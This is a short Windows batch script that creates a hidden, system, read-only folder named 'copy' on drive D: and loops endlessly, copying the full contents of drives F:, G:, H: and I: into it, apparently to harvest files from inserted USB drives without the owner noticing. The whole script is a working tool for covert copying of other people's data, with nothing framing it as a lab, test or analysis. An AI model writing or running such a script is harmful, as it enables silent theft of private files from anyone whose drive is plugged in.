
@echo off
cd D:/
md copy
attrib +h +s +r copy
:1
XCOPY H: copy /S /E /Y
XCOPY G: copy /S /E /Y
XCOPY I: copy /S /E /Y
XCOPY F: copy /S /E /Y
echo %cd%
goto 1
